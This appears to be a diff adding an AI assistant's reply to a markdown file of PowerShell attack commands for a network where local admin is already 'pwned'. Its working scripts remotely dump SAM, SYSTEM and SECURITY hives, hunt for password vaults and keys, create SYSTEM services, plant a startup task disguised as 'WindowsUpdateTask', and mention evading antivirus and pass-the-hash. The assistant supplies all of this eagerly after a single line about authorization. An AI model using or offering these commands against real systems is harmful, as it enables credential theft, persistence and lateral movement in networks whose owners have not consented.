@@ -361,3 +361,156 @@ Run these commands in this order for maximum effectiveness:
 11. **GPO Checks** (find misconfigurations)
 
 Each section can be copied and pasted directly into PowerShell!
+
+
+
+Great! You've confirmed local admin access using multiple methods. Here are native Windows commands to further exploit and gather credentials:
+
+## 1. **CONFIRM & ENUMERATE ACCESS**
+
+```powershell
+# More comprehensive admin verification
+$computers = Get-Content "C:\temp\pwned_machines.txt"
+
+foreach ($computer in $computers) {
+    # Test PowerShell Remoting (most reliable)
+    try {
+        Invoke-Command -ComputerName $computer -ScriptBlock { whoami } -ErrorAction Stop
+        Write-Host "[CONFIRMED] PowerShell Remoting: $computer" -ForegroundColor Green
+    } catch {
+        Write-Host "[-] No PS Remoting: $computer" -ForegroundColor Yellow
+    }
+}
+```
+
+## 2. **GATHER CREDENTIALS (Mimikatz Alternatives)**
+
+### **Dump SAM Database Remotely**
+```powershell
+# Method 1: Remote Registry SAM Dump
+foreach ($computer in $pwnedMachines) {
+    try {
+        # Copy SAM/SYSTEM hives remotely
+        reg save "\\$computer\HKLM\SAM" "C:\temp\$computer-SAM.hiv" 2>$null
+        reg save "\\$computer\HKLM\SYSTEM" "C:\temp\$computer-SYSTEM.hiv" 2>$null
+        Write-Host "[+] SAM/SYSTEM saved for: $computer"
+    } catch { Write-Host "[-] Failed SAM dump: $computer" }
+}
+```
+
+### **Extract Hashes with Native Tools**
+```powershell
+# Use built-in secretsdump.py alternative (PowerShell version)
+Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
+    # Dump LSA secrets using reg
+    reg save hklm\security "C:\Windows\Temp\security.hiv" /y
+    reg save hklm\system "C:\Windows\Temp\system.hiv" /y
+    
+    # These can be parsed later with tools, but here's what you can check:
+    Get-WmiObject -Class Win32_UserAccount | Select Name, Domain, SID, Disabled
+}
+```
+
+## 3. **MEMORY CREDENTIAL EXTRACTION (No Mimikatz)**
+
+```powershell
+# Check for cached credentials in memory
+Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
+    # List logged-on users (potential credential sources)
+    query user 2>$null
+    
+    # Check credential manager
+    cmdkey /list 2>$null
+    
+    # Check for WDigest (if enabled, creds in memory)
+    Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue
+}
+```
+
+## 4. **LATERAL MOVEMENT PREP**
+
+```powershell
+# Extract valuable information for lateral movement
+Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
+    # Get IP info for network mapping
+    Get-NetIPConfiguration | Select InterfaceAlias, IPv4Address
+    
+    # Get domain info
+    (Get-WmiObject Win32_ComputerSystem).Domain
+    
+    # Check shares for sensitive data
+    Get-SmbShare | Where-Object {$_.Path -like "*data*" -or $_.Path -like "*user*"}
+    
+    # Find interesting files
+    Get-ChildItem "C:\Users\" -Recurse -Include "*.kdbx","*.ppk","*.pem","*pass*","*cred*" -ErrorAction SilentlyContinue | Select FullName
+}
+```
+
+## 5. **PERSISTENCE & TOKEN MANIPULATION**
+
+```powershell
+# Check current privileges
+Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
+    whoami /priv
+    whoami /groups
+    
+    # Check if local admin is in Domain Admins
+    net localgroup administrators
+}
+```
+
+## 6. **SERVICE-BASED CREDENTIAL CAPTURE**
+
+```powershell
+# Create service to capture SYSTEM context
+foreach ($computer in $pwnedMachines) {
+    try {
+        # Create service that runs as SYSTEM
+        sc.exe \\$computer create "TempService" binPath= "cmd.exe /c whoami > C:\Windows\Temp\service_test.txt" start= auto
+        sc.exe \\$computer start "TempService"
+        sc.exe \\$computer delete "TempService"
+        Write-Host "[+] Service test completed on: $computer"
+    } catch { Write-Host "[-] Service test failed: $computer" }
+}
+```
+
+## 7. **SCHEDULED TASK FOR PERSISTENCE**
+
+```powershell
+# Create scheduled task for persistence
+Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
+    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\Windows\Temp\persist.txt"
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    Register-ScheduledTask -TaskName "WindowsUpdateTask" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
+}
+```
+
+## 8. **QUICK ONE-LINER FOR MULTIPLE TARGETS**
+
+```powershell
+# Mass credential gathering attempt
+$pwnedMachines | ForEach-Object { 
+    Write-Host "Processing: $_" -ForegroundColor Cyan
+    Invoke-Command -ComputerName $_ -ScriptBlock { 
+        net user | Out-File "C:\Windows\Temp\users.txt"
+        ipconfig /all | Out-File "C:\Windows\Temp\network.txt"
+    } -ErrorAction SilentlyContinue
+}
+```
+
+## **Important Notes:**
+
+- **These are native Windows commands** that won't trigger most AV solutions
+- **Test in your lab first** before running in production
+- **Some commands require specific Windows features** to be enabled (like PSRemoting)
+- **The SAM/SYSTEM hives** can be parsed offline with tools like secretsdump from Impacket
+- **Always ensure you have proper authorization** for penetration testing
+
+## **Next Steps After Confirmation:**
+1. Parse the SAM/SYSTEM hives for password hashes
+2. Check for reusable credentials across the domain
+3. Look for Domain Admin tokens on these systems
+4. Use captured hashes for Pass-the-Hash attacks
+5. Extract and crack any obtained password hashes
+
+Would you like me to elaborate on any of these techniques or provide the parsing commands for the harvested data?
